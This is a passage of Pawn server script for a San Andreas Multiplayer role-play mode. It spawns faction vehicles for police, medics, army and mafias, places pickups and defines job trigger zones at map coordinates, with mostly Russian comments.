	aHotel[2][0] = AddStaticVehicleEx(491,2610.1821,2279.5669,10.5586,88.5203,4,4,100); // LV ???
	AddStaticVehicleEx(491,2610.7830,2275.3374,10.5586,89.2854,4,4,100); // LV ???
	AddStaticVehicleEx(491,2611.1885,2271.0190,10.5586,89.8855,4,4,100); // LV ???
	AddStaticVehicleEx(491,2610.5500,2266.8823,10.5586,88.9736,4,4,100); // LV ???
	AddStaticVehicleEx(491,2609.5574,2262.5317,10.5586,88.4978,4,4,100); // LV ???
	AddStaticVehicleEx(491,2609.4319,2258.3789,10.5568,90.2535,4,4,100); // LV ???
	AddStaticVehicleEx(491,2610.3818,2254.4192,10.5516,88.9611,4,4,100); // LV ???
	AddStaticVehicleEx(491,2611.8760,2250.1465,10.5515,88.6023,4,4,100); // LV ???
	AddStaticVehicleEx(491,2593.6238,2279.0549,10.5585,268.9932,4,4,100); // LV ???
	AddStaticVehicleEx(491,2593.8723,2275.3311,10.5584,269.1771,4,4,100); // LV ???
	AddStaticVehicleEx(491,2593.7488,2271.6338,10.5586,269.8495,4,4,100); // LV ???
	AddStaticVehicleEx(491,2593.5322,2267.7957,10.5586,269.9911,4,4,100); // LV ???
	aHotel[2][1] = AddStaticVehicleEx(491,2593.8203,2263.8088,10.5585,269.4348,4,4,100); // LV ???
	//Медики LS
	aHospital[0][0] = AddStaticVehicleEx(416,1178.1208,-1308.4890,13.9971,267.5370,1,3,900); // hospital
	AddStaticVehicleEx(416,1183.7217,-1315.4930,13.7208,177.4501,1,3,900); // hospital
	AddStaticVehicleEx(416,1183.3890,-1332.6063,13.7284,180.5732,1,3,900); // hospital
	aHospital[0][1] = AddStaticVehicleEx(416,1179.0024,-1338.7366,13.9911,269.5879,1,3,900); // hospital
	aHospital[2][0] = AddStaticVehicleEx(416,1616.9485,1839.7766,10.9706,358.9094,1,3,900); // LV
	AddStaticVehicleEx(416,1612.5883,1839.6746,10.9737,359.1996,1,3,900); // LV
	AddStaticVehicleEx(416,1608.4215,1839.7316,10.9727,359.9915,1,3,900); // LV
	AddStaticVehicleEx(416,1604.2671,1839.6920,10.9785,0.6400,1,3,900); // LV
	AddStaticVehicleEx(416,1600.0608,1839.7880,10.9723,0.5822,1,3,900); // LV
	aHospital[2][1] = AddStaticVehicleEx(416,1595.7424,1839.6642,10.9720,0.6194,1,3,900); // LV
	aHospital[1][0] = AddStaticVehicleEx(416,-2691.3818,589.3907,14.6058,322.5470,1,3,900); // SF1
	AddStaticVehicleEx(416,-2685.8813,586.1801,14.6056,349.3502,1,3,900); // SF1
	AddStaticVehicleEx(416,-2679.4211,585.5439,14.6043,359.6515,1,3,900); // SF1
	AddStaticVehicleEx(416,-2635.6680,586.6409,14.6033,11.8443,1,3,900); // SF1
	AddStaticVehicleEx(416,-2628.8210,587.8708,14.6030,10.9003,1,3,900); // SF1
	aHospital[1][1] = AddStaticVehicleEx(416,-2621.2273,589.3113,14.6027,10.3721,1,3,900); // SF1
	//ВВС
	aArmy1[0] = AddStaticVehicleEx(470,278.3864,1949.4484,17.6330,268.4811,58,77,900); // car CB
	AddStaticVehicleEx(470,278.1216,1961.2740,17.6303,268.2277,58,77,900); // car CB
	AddStaticVehicleEx(470,277.7153,1995.6267,17.6347,270.3250,58,77,900); // car CB
	AddStaticVehicleEx(470,278.5241,1983.1259,17.6319,270.3934,58,77,900); // car CB
	AddStaticVehicleEx(470,276.7611,2029.0687,17.6339,268.2755,58,77,900); // car CB
	AddStaticVehicleEx(470,276.9034,2015.8909,17.6311,269.0788,58,77,900); // car CB
	AddStaticVehicleEx(433,363.6293,1906.9233,18.0772,179.7599,32,124,-1); // car CB
	aArmy1[1] = AddStaticVehicleEx(497,234.3897,1986.6165,25.8980,1.7555,236,16,900); // maverick CB
	aArmy2[0] = AddStaticVehicleEx(497,364.9075,2538.2505,16.8360,181.4555,236,16,900); // MAVERICK BBC
	AddStaticVehicleEx(520,327.0137,2538.1475,17.5300,179.9892,71,35,900); // gidra
	AddStaticVehicleEx(520,290.0973,2536.6250,17.5434,182.7577,107,10,900); // gidra
	AddStaticVehicleEx(520,188.5631,2539.9128,17.2821,179.4396,37,126,900); // gidra
	AddStaticVehicleEx(520,150.2627,2539.8372,17.2586,179.0216,99,118,900); // gidra
	AddStaticVehicleEx(520,93.4664,2452.0037,17.2076,0.3587,119,101,900); // gidra
	AddStaticVehicleEx(433,389.5696,2536.3906,17.0440,179.1073,84,29,-1); // gruz
	AddStaticVehicleEx(470,303.0540,2466.8909,16.4903,89.4160,57,79,900); // car BBC
	AddStaticVehicleEx(470,302.9773,2457.0703,16.4880,87.8985,58,77,900); // car BBC
	AddStaticVehicleEx(470,302.8240,2446.4553,16.4964,89.1945,58,77,900); // car BBC
	AddStaticVehicleEx(470,302.3978,2435.9561,16.4887,89.8699,58,77,900); // car BBC
	AddStaticVehicleEx(470,271.3999,2458.0125,16.4842,270.0651,58,77,900); // car BBC
	aArmy2[1] = AddStaticVehicleEx(470,271.1644,2467.7969,16.4852,268.7523,58,77,900); // car BBC
	//LSPD
	aLSPD[0] = AddStaticVehicleEx(596,1595.6506,-1711.8431,5.6183,359.8867,0,1,900); // lspdcar
	AddStaticVehicleEx(596,1591.7241,-1711.8275,5.6235,359.8774,0,1,900); // lspdcar
	AddStaticVehicleEx(596,1587.4192,-1711.8121,5.6188,359.3947,0,1,900); // lspdcar
	AddStaticVehicleEx(596,1583.4957,-1711.8350,5.5571,0.8552,0,1,900); // lspdcar
	AddStaticVehicleEx(596,1578.6215,-1711.8555,5.6216,0.8517,0,1,900); // lspdcar
	AddStaticVehicleEx(596,1574.6592,-1711.8396,5.6250,0.0291,0,1,900); // lspdcar
	AddStaticVehicleEx(596,1570.1732,-1711.8813,5.5593,0.0281,0,1,900); // lspdcar
	AddStaticVehicleEx(599,1564.6235,-1711.8700,6.0872,359.2119,0,1,900); // lspdranger
	AddStaticVehicleEx(596,1558.6179,-1711.8911,5.5346,359.9999,0,1,900); // lspdcar
	AddStaticVehicleEx(599,1546.8105,-1662.9476,6.0823,89.9610,0,1,900); // lspdranger
	AddStaticVehicleEx(599,1546.8788,-1659.0616,6.0797,89.2484,0,1,900); // lspdranger
	AddStaticVehicleEx(523,1548.1615,-1669.5220,5.4618,112.7056,0,1,900); // lspdmoto
	AddStaticVehicleEx(523,1548.2115,-1671.5839,5.4610,120.0000,0,1,900); // lspdmoto
	AddStaticVehicleEx(523,1548.2952,-1673.6007,5.4590,114.6303,0,1,900); // lspdmoto
	AddStaticVehicleEx(523,1548.1531,-1675.7496,5.4518,120.6376,0,1,900); // lspdmoto
	AddStaticVehicleEx(523,1548.1145,-1677.8777,5.4414,118.0241,0,1,900); // lspdmoto
	AddStaticVehicleEx(427,1538.8373,-1645.3999,5.9671,180.1406,0,1,900); // lspdswat
	AddStaticVehicleEx(528,1534.7966,-1644.2129,5.8976,179.5976,0,1,900); // lspdbtr
	AddStaticVehicleEx(601,1530.4061,-1644.6962,5.6965,178.8003,0,1,900); // lspdbtr
	AddStaticVehicleEx(427,1529.1628,-1688.1145,6.0276,270.2883,0,1,900); // lspd427
	addob = AddStaticVehicleEx(482,1546.3385,-1654.9017,6.0070,90.5229,0,0,-1); //  буритто
	//AttachDynamicObjectToVehicle(CreateDynamicObject(19420,0.0,0.0,0.0,0.0,0.0,0.0),addob,0.0,0.8,0.9,0.0,0.0,0.0);
	AddStaticVehicleEx(497,1551.5267,-1610.2773,13.5495,267.5521,0,1,900); // lspd_heli
	aLSPD[1] = AddStaticVehicleEx(427,1529.0786,-1683.8983,6.0236,270.4686,0,1,900); // lspd427
 //SFPD
	aSFPD[0] = AddStaticVehicleEx(601,-1639.2742,670.0042,-5.4486,269.8602,0,1,900); // sfpdvoda
	AddStaticVehicleEx(427,-1639.0233,682.1505,-5.0854,270.1815,0,1,900); // sfpdswat
	AddStaticVehicleEx(427,-1638.9888,686.3229,-5.0856,270.0407,0,1,900); // sfpdswat
	AddStaticVehicleEx(599,-1620.8568,692.8153,-4.9987,180.1635,0,1,900); // sfpdranger
	AddStaticVehicleEx(599,-1616.5930,692.8578,-5.0127,177.9342,0,1,900); // sfpdranger
	AddStaticVehicleEx(599,-1612.8293,692.7169,-5.0470,179.3193,0,1,900); // sfpdranger
	AddStaticVehicleEx(528,-1600.0597,676.2303,-5.1872,1.3288,0,1,900); // sfpdbtr
	AddStaticVehicleEx(528,-1596.2113,676.2355,-5.1945,356.3854,0,1,900); // sfpdbtr
	AddStaticVehicleEx(597,-1572.9147,706.0131,-5.4700,91.6360,0,1,900); // sfpdcar
	AddStaticVehicleEx(597,-1572.7220,710.3838,-5.4738,90.0642,0,1,900); // sfpdcar
	AddStaticVehicleEx(597,-1572.8831,714.5292,-5.5070,89.9968,0,1,900); // sfpdcar
	AddStaticVehicleEx(597,-1572.8605,718.1851,-5.4748,91.9907,0,1,900); // sfpdcar
	AddStaticVehicleEx(597,-1572.9169,722.1935,-5.4729,87.0568,0,1,900); // sfpdcar
	AddStaticVehicleEx(597,-1572.6735,726.5764,-5.4806,89.1766,0,1,900); // sfpdcar
	AddStaticVehicleEx(597,-1572.6223,730.6839,-5.4703,86.7548,0,1,900); // sfpdcar
	AddStaticVehicleEx(597,-1572.2717,742.8502,-5.4749,91.1999,0,1,900); // sfpdcar
	AddStaticVehicleEx(597,-1572.2643,738.7764,-5.4715,91.3459,0,1,900); // sfpdcar
	AddStaticVehicleEx(597,-1572.7437,734.6852,-5.5109,91.2371,0,1,900); // sfpdcar
	AddStaticVehicleEx(523,-1588.2140,750.4854,-5.6770,180.7430,0,1,900); // sfpdmoto
	AddStaticVehicleEx(523,-1592.1270,750.2172,-5.6754,177.9434,0,1,900); // sfpdmoto
	AddStaticVehicleEx(523,-1595.9806,750.4556,-5.6752,180.8003,0,1,900); // sfpdmoto
	AddStaticVehicleEx(523,-1600.3767,750.3168,-5.6756,177.7568,0,1,900); // sfpdmoto
	AddStaticVehicleEx(523,-1604.4688,750.4863,-5.6745,169.9970,0,1,900); // sfpdmoto
	addob = AddStaticVehicleEx(482,-1622.8169,653.5810,-5.1181,89.7575,0,0,-1); //  буритто
	AttachDynamicObjectToVehicle(CreateDynamicObject(19420,0.0,0.0,0.0,0.0,0.0,0.0),addob,0.0,0.8,0.9,0.0,0.0,0.0);
	aSFPD[1] = AddStaticVehicleEx(497,-1679.0399,705.5018,30.7489,91.9520,0,1,900); // sfpdvert
	//LVPD
	aLVPD[0] = AddStaticVehicleEx(528,2268.2695,2430.0938,3.3171,358.6068,0,1,900); // lvpdbtr
	AddStaticVehicleEx(528,2263.9670,2430.1416,3.3177,1.4797,0,1,900); // lvpdbtr
	AddStaticVehicleEx(601,2246.4668,2430.2537,3.0330,358.8506,0,1,900); // lvpdbtrvoda
	AddStaticVehicleEx(427,2240.3972,2442.6682,3.4036,271.4677,0,1,900); // lvpdswat
	AddStaticVehicleEx(427,2240.4106,2447.0754,3.4058,270.0402,0,1,900); // lvpdswat
	AddStaticVehicleEx(599,2272.5317,2473.7097,3.4714,0.1665,0,1,900); // lvpdranger
	AddStaticVehicleEx(599,2277.1033,2473.7627,3.4720,358.9612,0,1,900); // lvpdranger
	AddStaticVehicleEx(599,2281.4683,2473.8914,3.4715,359.7398,0,1,900); // lvpdranger
	AddStaticVehicleEx(598,2298.0623,2464.5388,3.0151,270.2421,0,1,900); // lvpdcar
	AddStaticVehicleEx(598,2297.9556,2460.4087,3.0232,271.0115,0,1,900); // lvpdcar
	AddStaticVehicleEx(598,2298.2161,2455.8787,3.0152,270.4524,0,1,900); // lvpdcar
	AddStaticVehicleEx(598,2298.2314,2451.5583,3.0229,269.8048,0,1,900); // lvpdcar
	AddStaticVehicleEx(598,2314.8003,2455.3889,3.0077,91.1429,0,1,900); // lvpdcar
	AddStaticVehicleEx(598,2314.8572,2460.4841,3.0074,91.8853,0,1,900); // lvpdcar
	AddStaticVehicleEx(598,2314.9209,2465.3906,3.0045,91.5347,0,1,900); // lvpdcar
	AddStaticVehicleEx(598,2315.1702,2470.2319,3.0205,89.5300,0,1,900); // lvpdcar
	AddStaticVehicleEx(598,2315.0566,2475.4482,3.0461,89.8078,0,1,900); // lvpdcar
	AddStaticVehicleEx(598,2314.9263,2480.1689,3.0197,89.2964,0,1,900); // lvpdcar
	AddStaticVehicleEx(523,2298.9216,2429.1909,2.8418,4.5826,0,1,900); // lvpdmoto
	AddStaticVehicleEx(523,2303.5938,2429.3633,2.8414,1.8499,0,1,900); // lvpdmoto
	AddStaticVehicleEx(523,2307.9351,2429.3860,2.8416,357.4909,0,1,900); // lvpdmoto
	AddStaticVehicleEx(523,2312.2292,2429.5088,2.8375,2.2066,0,1,900); // lvpdmoto
	AddStaticVehicleEx(523,2316.3352,2429.6118,2.8396,357.8275,0,1,900); // lvpdmoto
	AddStaticVehicleEx(497,2321.7639,2478.5476,38.9019,182.9352,0,1,900); // lvpdvert
	addob = AddStaticVehicleEx(482,2268.0413,2473.4277,3.3912,359.7198,0,0,-1); //  буритто
	AttachDynamicObjectToVehicle(CreateDynamicObject(19420,0.0,0.0,0.0,0.0,0.0,0.0),addob,0.0,0.8,0.9,0.0,0.0,0.0);
 	aLVPD[1] = AddStaticVehicleEx(497,2334.9746,2477.6904,38.8246,179.8571,0,1,900); // lvpdvert
 	aNews[0] = AddStaticVehicleEx(582,931.4254,-997.1667,37.8530,89.9071,4,4,900); // CNNCAR
	AddStaticVehicleEx(582,931.5058,-1001.3413,37.7897,90.7531,4,4,900); // CNNCAR
	AddStaticVehicleEx(582,904.4361,-1000.6641,37.4473,304.2306,4,4,900); // CNNCAR
	AddStaticVehicleEx(582,920.4362,-995.3289,37.8339,176.6245,4,4,900); // CNNCAR
	AddStaticVehicleEx(582,925.2493,-994.4216,37.8929,171.4963,4,4,900); // CNNCAR
	aNews[1] = AddStaticVehicleEx(488,932.5936,-1045.5635,31.7697,1.3036,4,4,900); // ЫЕРТАЛЕТСНН
	aFbi[0] = AddStaticVehicleEx(490,-1939.2209,-1051.5623,32.3237,42.7997,0,0,900); //
	AddStaticVehicleEx(490,-1938.9117,-1040.9116,32.3258,42.8863,0,0,900); //
	AddStaticVehicleEx(490,-1938.9800,-1046.2256,32.3349,43.2247,0,0,900); //
	AddStaticVehicleEx(490,-1938.9763,-1031.5836,32.3255,47.3784,0,0,900); //
	AddStaticVehicleEx(490,-1939.2104,-1026.3206,32.3257,57.2006,0,0,900); //
	AddStaticVehicleEx(421,-1951.4285,-1052.5206,32.0397,312.8699,0,0,900); //
	AddStaticVehicleEx(421,-1951.4054,-1047.5083,32.0397,311.0876,0,0,900); //
	AddStaticVehicleEx(421,-1951.3392,-1042.5715,32.0397,305.8933,0,0,900); //
	AddStaticVehicleEx(541,-1951.7748,-1033.4324,31.7859,297.5420,0,0,900); //
	AddStaticVehicleEx(487,-1964.3850,-1026.7274,59.5111,90.1465,0,0,900);
	aFbi[1] = AddStaticVehicleEx(482,-1951.3964,-1037.9213,32.2752,300.2894,0,0,900);
	aColomb[0] = AddStaticVehicleEx(579,983.2957,1737.4088,8.5534,91.2358,0,0,900); // ??????? 1
	AddStaticVehicleEx(579,983.2543,1743.2643,8.5500,90.8934,0,0,900); // ??????? 2
	AddStaticVehicleEx(580,982.8906,1728.7925,8.4766,90.5115,0,0,900); // ??????? 3
	AddStaticVehicleEx(580,983.0646,1722.6996,8.4553,92.4928,0,0,900); // ??????? 4
	AddStaticVehicleEx(413,966.7562,1707.4666,8.7388,270.1411,0,0,900); // ??????? 5
	AddStaticVehicleEx(562,962.7622,1757.2515,8.2951,180.6648,0,0,900); // ??????? 6
	AddStaticVehicleEx(415,957.1893,1757.2397,8.3790,179.5177,0,0,900); // ??????? 7
	aColomb[1] = AddStaticVehicleEx(409,950.0536,1720.3049,8.4780,180.0000,0,0,900); // ??????? 8
	aMexico[0] = AddStaticVehicleEx(413,1489.4847,2848.3916,10.9005,179.5161,0,0,900); // Мексиканская мафия, Микроавтобус
	AddStaticVehicleEx(429,1494.3987,2848.6724,10.5000,179.6496,0,0,900); // Мексиканская мафия, Банши
	AddStaticVehicleEx(475,1484.5610,2848.4897,10.6238,180.5806,0,0,900); // Мексиканская мафия, 2 местная
	AddStaticVehicleEx(475,1479.6790,2848.4487,10.6284,179.5388,0,0,900); // Мексиканская мафия, 2 местная2
	AddStaticVehicleEx(551,1470.2561,2847.9077,10.6208,179.7856,0,0,900); // Мексиканская мафия, седан
	AddStaticVehicleEx(551,1474.9502,2847.9304,10.6243,178.9046,0,0,900); // Мексиканская мафия, седан2
	AddStaticVehicleEx(409,1460.5490,2847.1379,10.6203,180.0582,0,0,900); // Мексиканская мафия, Лимузин
	aMexico[1] = AddStaticVehicleEx(551,1465.3999,2847.9902,10.6262,179.3685,0,0,900); // Мексиканская мафия, седан3
	aYakuza[0] = AddStaticVehicleEx(587,2602.8149,1833.7814,10.5475,269.9017,0,0,900); // Якудза, 2 дверка
	AddStaticVehicleEx(587,2602.8406,1846.6495,10.5472,269.5791,0,0,900); // Якудза, 2 дверка2
	AddStaticVehicleEx(409,2604.1509,1815.1091,10.6694,270.1126,0,0,900); // Якудза, Лимузин
	AddStaticVehicleEx(507,2603.3474,1808.6899,10.6456,270.0600,0,0,900); // Якудза, Седан
	AddStaticVehicleEx(507,2603.2710,1795.8799,10.6450,270.1973,0,0,900); // Якудза, Седан2
	AddStaticVehicleEx(507,2603.2988,1802.2318,10.6448,269.9311,0,0,900); // Якудза, Седан3
	AddStaticVehicleEx(413,2602.8401,1852.9973,10.9112,270.4146,0,0,900); // Якудза, Микроавтобус
	aYakuza[1] = AddStaticVehicleEx(477,2603.0874,1840.3208,10.5752,269.4748,0,0,900); // Якудза, ZR-350
	aMer[0] = AddStaticVehicleEx(421,1488.1039,-1737.7601,13.3269,269.7005,0,0,900); // meria
	AddStaticVehicleEx(421,1464.8687,-1737.6003,13.3269,269.5620,0,0,900); // meria
	AddStaticVehicleEx(579,1480.7799,-1737.8202,13.3710,269.7526,0,0,900); // meria
	AddStaticVehicleEx(409,1404.3350,-1777.4501,13.3313,115.5242,0,0,900); // meria
	AddStaticVehicleEx(507,1405.7542,-1782.3654,13.3566,110.3805,0,0,900); // meria
	aMer[1] = AddStaticVehicleEx(507,1405.4545,-1789.0905,13.3550,111.8795,0,0,900); // meria

	AddStaticVehicle(462,480.8977,-1649.2325,22.9728,180.5128,1,1); // faggio1
	AddStaticVehicle(462,481.9926,-1648.9960,22.7412,175.9954,1,1); //faggio2
	AddStaticVehicle(462,483.9572,-1649.2495,22.3402,179.1329,1,1); //faggio3
	AddStaticVehicle(462,485.2740,-1649.1923,22.0734,175.1498,1,1); //faggio4
	AddStaticVehicle(462,486.7183,-1648.8739,21.7681,176.5014,1,1); //faggio5
	AddStaticVehicle(462,487.6694,-1649.2452,21.5867,178.6488,1,1); //faggio6
	AddStaticVehicle(462,490.1927,-1649.2455,21.0425,171.9459,1,1); //faggio7
	AddStaticVehicle(462,492.0628,-1649.1614,20.6438,179.3207,1,1); //faggio7
	AddStaticVehicle(462,493.4565,-1649.2535,20.3575,174.3815,1,1); //faggio7
	AddStaticVehicle(462,495.2654,-1649.7482,20.0102,179.1607,1,1); //faggio8

	#include <objects>

	//Пикапы
	CreateDynamicPickup(1240,1,1300.8990,-828.4949,1624.9728); // БАНДЫ АПТЕЧКА
	CreateDynamicPickup(1275,1,-49.2835,-188.8889,928.7820); // ПИКАП РАБОТЫ, СЕЛЬХОЗ
	CreateDynamicPickup(1275,1,487.9110,904.2743,-30.4846);
	CreateDynamicPickup(1275,1,2451.2080,1949.4731,10.7148);
	CreateDynamicPickup(1275,1,59.7482,-322.2288,954.9484);
	CreateDynamicPickup(1275,1,2135.2578,-1991.8514,13.6483);
	CreateDynamicPickup(1239,1,319.6559,868.7329,19.9622);
	CreateDynamicPickup(1239,1,-2038.3032,-2380.3428,30.6422);
	CreateDynamicPickup(1318,1,507.6233,-1608.4905,16.3576);
	CreateDynamicPickup(1318,1,557.2006,-1291.8706,17.2482);
	CreateDynamicPickup(1318,1,-1968.6801,619.9734,35.1719);
	CreateDynamicPickup(1318,1,1658.5024,2199.9299,10.8203);
	CreateDynamicPickup(1239,1,-55.5989,-81.5608,1128.0669); // Мэрия
	CreateDynamicPickup(1239,1,2217.3040,-1146.6182,1025.7969);//Пикап рисэпшона
	CreateDynamicPickup(1239,1,1193.0955,-143.4155,922.4449);//Пикап экзамена АШ
	CreateDynamicPickup(1318,1,2148.9377,-1484.8975,26.6240); //Вход ballas
	CreateDynamicPickup(1318,1,2495.3943,-1691.1404,14.7656); //Вход groove
	CreateDynamicPickup(1318,1,2296.4370,-1882.2383,14.2344); //Вход aztecas
	CreateDynamicPickup(1318,1,2439.5891,-1357.1383,24.1005); //Вход vagos
	CreateDynamicPickup(1318,1,1673.6681,-2122.4548,14.1460); //Вход rifa
	CreateDynamicPickup(1318,1,1294.6316,-823.7710,1624.9728); //Выход для банд
	CreateDynamicPickup(1239,1,1797.4264,-1299.1569,22.2109); //Пикап работы в ЦЗ
	CreateDynamicPickup(1239,1,1345.9944,-805.9055,1185.7059); //Пикап столовой
	CreateDynamicPickup(19133,1,312.4241,-165.9406,999.6010,0); //Пикап аммо в армиях/PD
	CreateDynamicPickup(19133,1,312.4241,-165.9406,999.6010,1); //Пикап аммо в армиях/PD
	CreateDynamicPickup(19133,1,312.4241,-165.9406,999.6010,2); //Пикап аммо в армиях/PD
	CreateDynamicPickup(19133,1,312.4241,-165.9406,999.6010,3); //Пикап аммо в армиях/PD
	CreateDynamicPickup(19133,1,312.4241,-165.9406,999.6010,4); //Пикап аммо в армиях/PD
	CreateDynamicPickup(19133,1,312.4241,-165.9406,999.6010,5); //Пикап аммо в армиях/PD
	CreateDynamicPickup(1239,1,2551.6938,-1294.2773,1060.9844); // Мафия
	CreateDynamicPickup(1240,1,-311.8397,-233.4846,1082.7289); // Тюрьма еда
	CreateDynamicPickup(1274,1,1130.2373,-13.4374,1000.6797); // КАЗИНО
	CreateDynamicPickup(1239,1,1204.8088,12.6639,1000.9219); // ПРОСТИТУТКИ
	CreateDynamicPickup(1239,1,-1091.7751,-1057.1841,129.2119); // ПОКУПКА ЗЕМЛИ
	CreateDynamicPickup(1318,1,-1054.5221,-1036.7003,129.2188); // Зем.Участок
	CreateDynamicPickup(1318,1,-1054.5198,-965.8053,129.2188); // Зем.Участок
	CreateDynamicPickup(1318,1,-1142.9214,-962.5409,129.2188); // Зем.Участок
	CreateDynamicPickup(1318,1,-1142.9067,-1031.4019,129.2188); // Зем.Участок
	CreateDynamicPickup(1318,1,299.8485,310.3893,1003.3047); // Зем.Участок ВЫХОД
	CreateDynamicPickup(1239,1,1714.8439,-1671.1849,20.2242); // РЕСЕПШИН
	CreateDynamicPickup(1240,1,1706.0703,-1651.4092,20.2205); // HP отель
	CreateDynamicPickup(1240,1,1703.0901,-1659.7465,20.2198); // BAR отель
	CreateDynamicPickup(1239,1,-81.7024,-83.8172,1128.0669); //Мэрия, оружие брать
	CreateDynamicPickup(1239,1,-1656.1304,1209.8882,7.2500); // ПОКУПКА АВТО
	CreateDynamicPickup(1239,1,1765.3303,-1940.9227,13.5696); // ПОЕЗД ЛС
	CreateDynamicPickup(1239,1,-1970.7937,157.8173,27.6875); // ПОЕЗД СФ
	CreateDynamicPickup(1239,1,2853.1799,1290.0969,11.3906); // ПОЕЗД ЛВ
	CreateDynamicPickup(1318,1,82.9852,-332.5636,1094.8015); // POEZD VHOD
	CreateDynamicPickup(1239,1,-96.8171,-13.2540,1151.1399); // УНИВЕР ВЗЯТЬ ЗАДАНИЕ
	CreateDynamicPickup(1239,1,-79.5226,-20.7606,1151.1399); // УНИВЕР ВЗЯТЬ ЗАДАНИЕ
	CreateDynamicPickup(1239,1,-71.6005,-20.7362,1151.1399); // УНИВЕР ВЗЯТЬ ЗАДАНИЕ
	CreateDynamicPickup(1239,1,1299.5559,-821.3093,1624.9728); // БАНДЫ, ДЕЛКА ОРУЖИЯ
	CreateDynamicPickup(1239,1,-1715.0265,60.4164,3.5495); // АРМИИ  + ПД ДАЛЬНОБОИ
	CreateDynamicPickup(1239,1,1183.1179,-120.8024,922.4449); // АВТОШКОЛА ТЕОРИЯ
	//Зоны
	gAreas[arZavodSklad] = CreateDynamicSphere(2134.0593,-1978.8242,13.5469,2.0,0,0);
	gAreas[arZavodSklad2] = CreateDynamicSphere(-1715.0265,60.4164,3.5495,2.0,0,0);
	gAreas[arZavod] = CreateDynamicSphere(2154.7952,-1972.4408,13.6738,1.0,0,0);
	gAreas[arZavodTS] = CreateDynamicSphere(62.3760,-274.5660,954.9484,1.5,1,1);
	gAreas[arPodval] = CreateDynamicSphere(1389.9829,-25.7893,1000.9229,1.0);
	gAreas[arPodval1] = CreateDynamicSphere(1387.5725,-25.3795,1000.9229,1.0);
	gAreas[arSelo] = CreateDynamicSphere(-49.2835,-188.8889,928.7820,1.0,1,1);
	gAreas[arCoalman] = CreateDynamicSphere(2451.2080,1949.4731,10.7148,1.0,0,0);
 	gAreas[arWood] = CreateDynamicSphere(59.7482,-322.2288,954.9484,1.0,1,1);
 	gAreas[arGangJob] = CreateDynamicSphere(1149.5842,-1354.2788,13.6992,2.0,0,0);
 	gAreas[arRecep] = CreateDynamicSphere(1714.8439,-1671.1849,20.2242,1.0,-1,18);
 	gAreas[arKit] = CreateDynamicSphere(57.6946,-316.2592,954.9484,1.0,1,1);

 	gAreas[arMafiaJob][0] = CreateDynamicSphere(gMafiaCP[0][0],gMafiaCP[0][1],gMafiaCP[0][2],3.0);
	gAreas[arMafiaJob][1] = CreateDynamicSphere(gMafiaCP[1][0],gMafiaCP[1][1],gMafiaCP[1][2],3.0);
	gAreas[arMafiaJob][2] = CreateDynamicSphere(gMafiaCP[2][0],gMafiaCP[2][1],gMafiaCP[2][2],3.0);
	gAreas[arMafiaJob][3] = CreateDynamicSphere(gMafiaCP[3][0],gMafiaCP[3][1],gMafiaCP[3][2],3.0);
	gAreas[arMafiaJob][4] = CreateDynamicSphere(gMafiaCP[4][0],gMafiaCP[4][1],gMafiaCP[4][2],3.0);
	gAreas[arMafiaJob][5] = CreateDynamicSphere(gMafiaCP[5][0],gMafiaCP[5][1],gMafiaCP[5][2],3.0);
	gAreas[arMafiaJob][6] = CreateDynamicSphere(gMafiaCP[6][0],gMafiaCP[6][1],gMafiaCP[6][2],3.0);

	gAreas[arMafiaJob1][0] = CreateDynamicSphere(gMafiaCP2[0][0],gMafiaCP2[0][1],gMafiaCP2[0][2],3.0);
	gAreas[arMafiaJob1][1] = CreateDynamicSphere(gMafiaCP2[1][0],gMafiaCP2[1][1],gMafiaCP2[1][2],3.0);
	gAreas[arMafiaJob1][2] = CreateDynamicSphere(gMafiaCP2[2][0],gMafiaCP2[2][1],gMafiaCP2[2][2],3.0);
	gAreas[arMafiaJob1][3] = CreateDynamicSphere(gMafiaCP2[3][0],gMafiaCP2[3][1],gMafiaCP2[3][2],3.0);
	gAreas[arMafiaJob1][4] = CreateDynamicSphere(gMafiaCP2[4][0],gMafiaCP2[4][1],gMafiaCP2[4][2],3.0);
	gAreas[arMafiaJob1][5] = CreateDynamicSphere(gMafiaCP2[5][0],gMafiaCP2[5][1],gMafiaCP2[5][2],3.0);
	gAreas[arMafiaJob1][6] = CreateDynamicSphere(gMafiaCP2[6][0],gMafiaCP2[6][1],gMafiaCP2[6][2],3.0);

	gAreas[arSeloLoad1] = CreateDynamicSphere(-41.0592,-189.0606,928.7820,2.0);
	gAreas[arSeloLoad2] = CreateDynamicSphere(gSeloCP[0][0],gSeloCP[0][1],gSeloCP[0][2],1.0);
	gAreas[arSeloLoad3] = CreateDynamicSphere(gSeloCP[1][0],gSeloCP[1][1],gSeloCP[1][2],1.0);
	gAreas[arSeloLoad4] = CreateDynamicSphere(gSeloCP[2][0],gSeloCP[2][1],gSeloCP[2][2],1.0);
	gAreas[arSeloLoad5] = CreateDynamicSphere(gSeloCP[3][0],gSeloCP[3][1],gSeloCP[3][2],1.0);
	gAreas[arSeloLoad6] = CreateDynamicSphere(gSeloCP[4][0],gSeloCP[4][1],gSeloCP[4][2],1.0);
	gAreas[arSeloLoad7] = CreateDynamicSphere(-22.2324,-186.5984,928.7820,2.0);

	gAreas[arZavodLoad1] = CreateDynamicSphere(gZavodCPs[0][0],gZavodCPs[0][1],gZavodCPs[0][2],1.0);
	gAreas[arZavodLoad2] = CreateDynamicSphere(gZavodCPs[1][0],gZavodCPs[1][1],gZavodCPs[1][2],1.0);
	gAreas[arZavodLoad3] = CreateDynamicSphere(gZavodCPs[2][0],gZavodCPs[2][1],gZavodCPs[2][2],1.0);

	gAreas[arCoalmanLoad1] = CreateDynamicSphere(2486.4209,1934.9823,9.8399,2.0);
	gAreas[arCoalmanLoad2] = CreateDynamicSphere(2412.1968,1926.2626,6.0156,2.0);
	gAreas[arWoodLoad1] = CreateDynamicSphere(gWoodCPs[0][0],gWoodCPs[0][1],gWoodCPs[0][2],0.8);
	gAreas[arWoodLoad2] = CreateDynamicSphere(gWoodCPs[1][0],gWoodCPs[1][1],gWoodCPs[1][2],0.8);
	gAreas[arWoodLoad3] = CreateDynamicSphere(gWoodCPs[2][0],gWoodCPs[2][1],gWoodCPs[2][2],0.8);
	gAreas[arWoodLoad4] = CreateDynamicSphere(gWoodCPs[3][0],gWoodCPs[3][1],gWoodCPs[3][2],0.8);
	gAreas[arWoodLoad5] = CreateDynamicSphere(gWoodCPs[4][0],gWoodCPs[4][1],gWoodCPs[4][2],0.8);
	gAreas[arWoodLoad6] = CreateDynamicSphere(gWoodCPs[5][0],gWoodCPs[5][1],gWoodCPs[5][2],0.8);
	gAreas[arWoodLoad7] = CreateDynamicSphere(gWoodCPs[6][0],gWoodCPs[6][1],gWoodCPs[6][2],0.8);
